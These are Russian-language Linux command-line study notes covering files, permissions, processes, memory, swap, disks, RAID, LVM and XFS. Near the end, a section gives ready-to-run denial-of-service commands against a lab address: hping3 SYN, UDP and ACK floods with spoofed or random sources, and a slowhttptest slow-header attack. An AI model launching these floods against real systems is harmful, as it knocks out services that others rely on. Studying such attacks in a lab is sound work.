## Командная строка

# Грячие клавиши
- Ctrl + Alt + T Запуск терпинала
- Сtrl + C Остановить выполнение текущей команды:
- Ctrl + L (или команда clear) Очистить экран
- Ctrl + D (команда exit) Выход из консоли
- history История команд
- Сtrl + R

- Показать имя текущего пользователя: whoami
- Вывести подробную информацию о пользователе username: id username
- Переключиться на другого пользователя можно с помощью команды su -
- Можно также получить доступ к командной строке пользователя root: sudo -i

# Создание каталога, удаление файлов и каталогов
 Создание:
- mkdir path1 ...
Удаление:
- rm [-r][-f] path1 ...
● -r — рекурсивно (т. е. все вложенные файлы и каталоги)
● -f — без подтверждения
- rmdir [-p] path1 ... — удаляет только пустые каталоги
-p (parents) — удаляет или создает дерево каталогов
-i будет спрашивать подтверждение действие

# Копирование и переименование
Копирование файла:
cp <исходный_путь> <конечный_путь>

Копирование каталога со всем его содержимым (рекурсивно):
cp -r <исходный_путь> <конечный_путь>

Переименование/перемещение:
mv <исходный_путь> <конечный_путь>

! Важно: <конечный_путь> может быть каталогом, а <исходный_путь>
может быть несколько

# Чтобы такой файл можно было запускать как программу, нужно выставить соответствующий атрибут:
chmod +x <file> /если без атрибутув то для всех, 
- u для пользователя
- g для группы
- o других

# Процесс
- ps -a Утилита ps позволяет просмотреть запущенные процессы:
- ps x — процессы, запущенные текущим пользователем
- ps ax — все процессы в системе
- ps u — детализированный вывод
- ps aux | grep bash — найти подстроку bash среди списка всех запущенных процессов
- top / Утилита для просмотра процессов
- htop / дополнительная утилита для просмотра процессов

ps aux | grep root — показать все процессы 0пользователя root
ps aux | grep root | wc -l — подсчитать количество таких процессов

# Потоки
- ps m — просмотр потоков:
- ps -eLf — просмотр потоков:

Статус процесса ps
● -e, -A — все процессы
● -t — только процессы этой консоли
● -N — инверсия (ps -N -t — все процессы, кроме этой консоли)
● -p <PID>,<PID> — просмотр процессов с заданным PID
● -С <строка> — просмотр процессов c заданной командой
● -U <username> — просмотр процессов заданного пользователя
● -G <group> — просмотр процессов заданной группы

# Утилита pidstat Мониторинг выбранного процесса в реальном времени
- sudo apt install sysstat

# Команды Linux для работы с памятью
● top — отображает потребление ресурсов процессами в реальном
времени и другую информацию
● free — утилита для отображения состояния памяти
● cat /proc/meminfo — раздел файловой системы /proc с текущей
информацией о состоянии памяти в операционной системе


# Убить процесс
kill
kill <pid>
kill -<имя_сигнала> 
kill -s <имя_сигнала>
● KILL — завершает процесс на уровне ядра, не блокируется
● INT — запрос на завершение текущей операции (Ctrl + C)
● TERM — запрос на завершение программы

kill -l /список сигналов
killall nano
sudo pkill -u user2

№ Каталог /proc
cat /proc/cpuinfo — информация о CPU
cat /proc/version — версия Linux
cat /proc/stat — системная статистика

● cgroup — группа управления процесса
● fd — дескрипторы открытых файлов
● cmdline — командная строка
● environ — переменные окружения
● stat — информация о состоянии процесса (ps)
● statm — информация об использовании памяти
● root — ссылка на корневой каталог процесса

# Утилита strace
sudo strace -p 3359
sudo strace -p 3359 -P /home/user/ 
sudo strace -p 3359 -e trace=file

# Просмотр содержимого каталога
- Просмотр каталога: ls
- Просмотр атрибутов файлов: ls -l
- Просмотр всех файлов, включая скрытые: ls -a
Опции можно комбинировать:
● просмотр атрибутов директории, а не её содержимого: ls -ld
● просмотр с отображением человекочитаемого размера: ls -lh
 - Подсветка типо файлов  ls --color=auto

# Команда chmod Linux 
chmod опции права /путь/к/файлу

r - чтение;
w - запись;
x - выполнение;
s - выполнение  от имени суперпользователя (дополнительный);

u - владелец файла;
g - группа файла;
o - все остальные пользователи;

В качестве действий могут использоваться знаки "+" - включить или "-" - отключить. Рассмотрим несколько примеров:

u+x - разрешить выполнение для владельца;
ugo+x - разрешить выполнение для всех;
ug+w - разрешить запись для владельца и группы;
o-x - запретить выполнение для остальных пользователей;
ugo+rwx - разрешить все для всех;

Второй вариант 
0 - никаких прав;
1 - только выполнение;
2 - только запись;
3 - выполнение и запись;
4 -  только чтение;
5 - чтение и выполнение;
6 - чтение и запись;
7 - чтение запись и выполнение.
Права на папку linux такие же, как и для файла. Во время установки прав сначала укажите цифру прав для владельца, затем для группы, а потом для остальных

-c - выводить информацию обо всех изменениях;
-f - не выводить сообщения об ошибках;
-v - выводить максимум информации;
--preserve-root - не выполнять рекурсивные операции для корня "/";
--reference - взять маску прав из указанного файла;
-R - включить поддержку рекурсии;
--version - вывести версию утилиты;

# Команда chown Linux смена владельца файла

chown пользователь опции /путь/к/файлу
В поле пользователь надо указать пользователя, которому мы хотим передать файл. Также можно указать через двоеточие группу, например, пользователь:группа
Опции:
-c, --changes - подробный вывод всех выполняемых изменений;
-f, --silent, --quiet - минимум информации, скрыть сообщения об ошибках;
--dereference - изменять права для файла к которому ведет символическая ссылка вместо самой ссылки (поведение по умолчанию);
-h, --no-dereference - изменять права символических ссылок и не трогать файлы, к которым они ведут;
--from - изменять пользователя только для тех файлов, владельцем которых является указанный пользователь и группа;
-R, --recursive - рекурсивная обработка всех подкаталогов;
-H - если передана символическая ссылка на директорию - перейти по ней;
-L - переходить по всем символическим ссылкам на директории;
-P - не переходить по символическим ссылкам на директории (по умолчанию).

## Команда MAN
Навигация:
● j — вниз, k — наверх
● q — выход
● / — поиск, n — следующее совпадение, q — выход

# Синтаксис и опции less
Наиболее популярные опции:

-a, --search-skip-screen — не осуществлять поиск в тексте, который в данный момент отображен на экране;
-bn, --buffers=n — задать размер буфера памяти;
-c, --clear-screen — листать текст, полностью стирая содержимое экрана (построчная прокрутка работать не будет);
-Dxcolor, --color=xcolor — задать цвет отображаемого текста;
-E, --QUIT-AT-EOF — выйти, когда утилита достигнет конца файла;
-e, --quit-at-eof — выйти, когда утилита второй раз достигнет конца файла;
-F, --quit-if-one-screen — выйти, если содержимое файла помещается на одном экране;
-f, --force — открыть специальный файл;
-hn, --max-back-scroll=n — задать максимальное количество строк для прокрутки назад;
-yn, --max-forw-scroll=n — задать максимальное количество строк для прокрутки вперёд;
-i, --ignore-case — игнорировать регистр;
-I, --IGNORE-CASE — игнорировать регистр, даже если паттерн для поиска содержит заглавные буквы;
-jn, --jump-target=n — указать, в какой строке должна быть выведена искомая информация;
-J, --status-column — пометить строки, соответствующие результатам поиска;
-n, --line-numbers — не выводить номера строк;
-N, --LINE-NUMBERS — вывести номера строк;
-s, --squeeze-blank-lines — заменить множество идущих подряд пустых строк одной пустой строкой;
-w, --hilite-unread — выделить первую строку нового фрагмента текста.
Во время просмотра текста утилитой можно управлять при помощи внутренних команд, набирая их на клавиатуре компьютера. Наиболее часто используемые из них:

h, H — справка;
Space, Ctrl+V, f, Ctrl+F — прокрутить текст на один экран вперёд;
Enter, Return, Ctrl+N, e, Ctrl+E, j, Ctrl+J — прокрутить текст на n строк вперед, по умолчанию n=1;
y, Ctrl+Y, Ctrl+P, k, Ctrl+K — прокрутить текст на n строк назад, по умолчанию n=1;
Ctrl+→ — прокрутить текст по горизонтали в конец строки;
Ctrl+← — прокрутить текст по горизонтали в начало строки;
:d — удалить текущий файл из списка файлов;
Ctrl+G, :f — вывести основную информацию о файле;
q, Q, :q, :Q, ZZ — выход.

# Команды Linux для работы с кешем

- sysctl -a | grep dirty — найти в настройках Linux параметры, которые используются при кешировании («грязные» страницы).

В файле /etc/sysctl.conf:
● vm.dirty_background_ratio = 10 — процент от памяти, которая может быть использована для хранения кеша перед записью на диск в фоновом режиме
● vm.dirty_ratio = 15 — максимум памяти, который может быть выделен под кеш до записи на диск. При достижении этого значения ввод/вывод блокируется до освобождения кеша
● vm.dirty_expire_centisecs = 3000 — время нахождения «грязных» страниц в кеше

● sync — команда заставляет Linux записать все кешированные данные на диск
● echo 1 > /proc/sys/vm/drop_caches — очистка кеша PageCache
● echo 2 > /proc/sys/vm/drop_caches — очистка inode и dentrie
● echo 3 > /proc/sys/vm/drop_caches — очистка inode, dentrie и PageCache

# Программы mkswap, swapon, swapoff
● swapon -s; grep Swap /proc/meminfo; free -h — показывают использование файла подкачки
● mkswap /swapfile — размечает файл /swapfile как файловую систему SWAP
● swapoff\swapon /swapfile — отключение/подключение файла подкачки в систему
● cat /etc/fstab — выводит список устройств для монтирования. Можно приписать SWAP-раздел

- fallocate -l 2G /swapfile  / создарие swap файла
- chmod 600 swapfile / делаем его оступным только root
- mkswap swapfile  / сообщаем системе, что это swap
- swapom /swapfile  

для BTRFS систем всё одной строкой
- btrfs systemfilemmkswapfile --size 2G / swapfile
swapom /swapfile

- swapon -s  / посмотреть соданный swap

- swapoff swapfile  / отключение swap

Для постоянной работы необходимо прписать его в файле
/ets/fstab
/swapfile none swap sw 0 0 

# tmpfs — это виртуальная файловая система, располагающаяся в оперативной памяти.
Сначала создаем директорию
- sudo mkdir /mytmpfs
Потом монтируем
- sudo mount -t tmpfs -o size=1000M tmpfs /mytmpfs

-df -h /просмотр файлов монтирования

# time  -показывает время выполнение процесса
# taskset С помощью утилиты taskset можно задавать, на каких процессорахбудет исполняться программа, или менять по PID:

taskset [options] mask command [argument...]
taskset [options] -p [mask] pid

# Как использовать nice
● nice -n {приоритет} {программа} {аргументы}
● sudo nice -n — если приоритет меньше 0
● renice -n {приоритет} PID — для уже запущенного процесса
● renice -n -g -u — для запущенной группы процессов, для пользователя
● ps ax -o pid,ni,cmd — чтобы посмотреть nice запущенных процессов

# Работа с текстовыми файлами
● Вывести строку text на экран: echo text   
echo $USER вывод переменной пользователь
● Вывести содержимое файла filename: cat filename
● Постраничный просмотр файла filename: less filename
● Редактировать файл filename в терминале: nano filename
● Редактировать файл filename в GUI: gedit filename
● Показать последние 10 строк файла filename: tail filename
● Показать первые 10 строк файла filename: head filename
● Поиск подстроки строка в файле filename: grep строка filename

# VIM
- vimtutor для запуска справки и тренеровки
# установка программа 
- sudo apt install имя пакета / установка проводиться от имени root
- sudo apt remove имя пакета / удаление 
- sudo apt autoremove / удаление зависимостей
- apt search имя пакета / посик по пакетам
- apt show имя пакета /информация о пакете
- sudo apt update / скачивание обновлений
- sudo apt upgrade / обновление пакетов

# Командная строка: перенаправление и конвейер
Потоки ввода-вывода:
● stdin — стандартный поток ввода
● stdout — стандартный поток вывода
● stderr — стандартный поток ошибок

sort < file.txt перенаправит файл file.txt в stdin команды sort
ls > file.txt перенаправит stdout команды ls в файл file.txt
ls 2> file.txt перенаправит stderr команды ls в файл file.txt
>> допишет в файл новые строки, в то время как > перезапишет его
ls | sort отправит stdout команды ls в stdin команды sort

find /etc 1> etc_files (скопировать списко найденных файлов в файл) 2> etc_errors (скопировать список файлов ошибок)


# Экранирование
- через карвычки " "  или '  ' 
- Поставить обратный слэш   \      \   



## СЕТЬ

- ip address show 
- ip route show 
- nmcli 
- nmtui / для настройки сети

# Команды Linux для работы с аппаратным обеспечением
● cat /proc/devices – отображает список устройств, опознанных ядром
● ls -la /dev/disks/by-* – выводит информацию о дисках, подключенных к
системе
● ls -la /dev – каталог специального назначения, который содержит файлы
устройств.
● lsblk – list block devices
● lshw -short -C disk, hdparm -I /dev/sda, smartctl --all /dev/nvme0 – утилиты,
которые отображают информацию об имеющихся дисках с точки зрения
железа

# Команды Linux для device mapper
● /dev/mapper/vgdata-lvdata — ссылки на устройства, созданные device mapper
● /dev/dm-0, /dev/dm-1 — устройства, которые создаются device mapper
● /dev/vgdata/lvdata — ссылки на устройства, созданные device mapper
● dmsetup ls — отображает список устройств, созданных с помощью device mapper

# Команды Linux для работы с дисками и разделами
● lsblk — утилита выводит список блочных устройств с информацией о них
● blkid — утилита отображает информацию об уникальных идентификаторах блочных устройств
● fdisk — утилита позволяет управлять разделами с разметкой MBR.
- sudo fdisk /dev/sdb
● gdisk — утилита позволяет управлять разделами с разметкой GPT
● parted — утилита позволяет управлять разделами с разметкой MBR и GPT. В отличие от gdisk и fdisk изменения применяются сразу, не требуя подтверждения
 - print 
 - mklabel gpt . создание раздела gpt
 - mkpart
● cat /proc/partitions — вывести список разделов

- sudo wipefs --all --backup /dev/sdb    /удаление всей информации в разделе

# Команды Linux для работы с RAID
● sudo yum (apt-get) install mdadm — установка утилиты
● sudo mdadm --create /dev/md0 -l 1 -n 2 /dev/sd{b,c} — создание нового массива
● sudo mdadm /dev/md0 --fail /dev/sdb1  пометить как не работающий
● sudo mdadm /dev/md0 --remove /dev/sdb1  удалить диск
● sudo mdadm /dev/md0 --add /dev/sdd1
● mdadm --stop /dev/md0  остановка массива до следующей перезагрузки
● mdadm --zero-superblock /dev/sdb1 /dev/sdd1  полнустью отключение массива
● cat /proc/mdstat — текущее состояние
● /etc/mdadm.conf — файл конфигурации

# Команды Linux для изменения LVM
● pvcreate — позволяет создать физический том на жестком диске
 - sudo pvcreate /dev/sdb /dev/sdc
● vgcreate — позволяет создать группу томов из физических томов
- sudo vgcreate my-group /dev/sdb /dev/sdc 
- sudo vgdisplay 
- sudo lvextend -l +1280 /dev/my-group/my-vol1

● lvcreate — позволяет создать логический том в группе томов
- lvcreate -n my-vol1 -L 1G my-group
- lvresize
- lvremove 

- dmsetup ls 
- ls -l /dev/mapper/my--group-my-vol1
или 
-ls -l /dev/my-group/my-vol1
или 
-ls -l /dev/dm-0

# Команды Linux для получения состояния LVM
● sudo pvs — позволяет отобразить информацию о физических томах
 - sudo pvscan
● sudo vgs — позволяет отобразить информацию о группах томов в ОС
● sudo lvs — позволяет отобразить информацию о логических томах


- sudo mkfs.xfs /dev/my-group/my-vol1  / создание файловой системы XFS
перед этим поставить xfsgroups

# Монтирование 
Сначала создаем дерикторию для монтирования
- mkdir /mnt/vol1
- mount -t xfs /dev/my-group/my-vol1 /mnt/vol1

# Команды Linux для диагностики нагрузки на
дисковую подсистему
● top — выводит информацию о работающих в системе процессах и информацию о них
● iostat — мониторинг использования дисковых разделов
● iotop — аналогична утилите top, но вместо использования процесcами CPU и памяти показывает работу процессов с дисками
● vmstat 5 5 — утилита отображает информацию об использовании CPU, памяти, дисков
● sar -p -d 5 3 — утилита для отображения различных параметров (статистики) работы системы

# Команды Linux для работы с разделами
● cat /proc/filesystems — вывести список файловых систем, которые поддерживаются ядром
● fsck — утилита, с помощью которой можно проверить ФС на ошибки
● file -s /dev/sda1 — выводит тип файловой системы
● df -T — выводит тип файловой системы

# Команды Linux для работы с inodes
● stat — утилита позволяет просматривать состояние файла и даже файловой системы
● df -i — утилита выводит информацию о файловых системах, их размере, занятом и свободном пространстве и точках монтирования
● ls -i — утилита отображает список файлов в каталоге
● file -s /dev/sda3 — отобразить информацию о разделе

# Команды для работы с XFS
● mkfs.xfs /dev/sda1 — создаёт файловую систему
● xfs_info /dev/sda1 — выводит информацию про метаданные файловой
системы
● xfs_growfs / -d — увеличивает файловую систему на всё доступное
пространство
● xfs_check /dev/sdb1, xfs_repair /dev/sdb1 — проверяет файловую систему на
ошибки

## С помощью дистрибутива Kali Linux и утилиты hping3 сможем создать SYN-flood атаку:

kali@kali:~$ sudo hping3 -c 10000 -d 150 -S -p 80 --flood --rand-source 192.168.0.2

-c — количество пакетов,
-d — размер каждого пакета
-p — номер порта,
-S — установить SYN-флаг,
–flood — посылать пакеты с максимально возможной скоростью.
192.168.0.2 — адрес атакуемого сервера

В дистрибутиве Kali Linux можно запустить UDP-flood атаку:

kali@kali:~$ sudo hping3 --flood --udp -p 80 -d 65500 192.168.0.2

В дистрибутиве Kali Linux можно запустить ACK-flood атаку:

kali@kali:~$ sudo hping3 --flood -A -p 80 -d 10000 192.168.0.2

В дистрибутиве Kali Linux можно запустить ACK-flood атаку:

kali@kali:~$ sudo hping3 --flood -c 10000 -s 1515 -p 1516 -S -a 192.168.0.2 192.168.0.2

- Рассмотрим процесс запуска Slow-атаки:

Установим Slowhttptest:
kali@kali:~$ sudo apt install slowhttptest

Убедимся, что программа установлена корректно, для этого запустим справку:
kali@kali:~$ slowhttptest -h

Запустим атаку:
$ slowhttptest -c 50000 -H -r 1000 -t GET -u http://192.168.0.2:8000

-с — количество соединений, которое нужно установить,
-H — атака с медленными заголовками,
-r — количество соединений в секунду,
-t — запрос,
-u — URL цели.


## Выключение и перезагрузка
- Выключение: systemctl poweroff — аналог устаревшего shutdown -P now
- Перезагрузка: systemctl reboot — аналог устаревшего shutdown -r now